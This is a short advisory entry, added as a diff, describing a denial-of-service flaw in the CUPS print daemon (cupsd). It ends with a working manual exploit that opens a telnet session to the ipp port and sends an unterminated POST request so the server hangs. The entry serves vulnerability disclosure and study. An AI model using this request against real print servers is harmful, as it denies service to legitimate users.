@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/7637/info
+
+The cupsd has been reported prone to a denial of service vulnerability.
+
+Reportedly the cupsd does not adequately apply a time-out process for malicious HTTP requests and service is denied to subsequent cupsd requests.
+
+This issue may be exploited by remote attackers to deny cupsd service to valid users.
+
+$ telnet <your_favorite_cups_server> ipp
+POST /printers/<your_favorite_printer> HTTP/1.1
+
+Don't enter the second carriage return to complete the headers, just the POST line and one carriage return. 
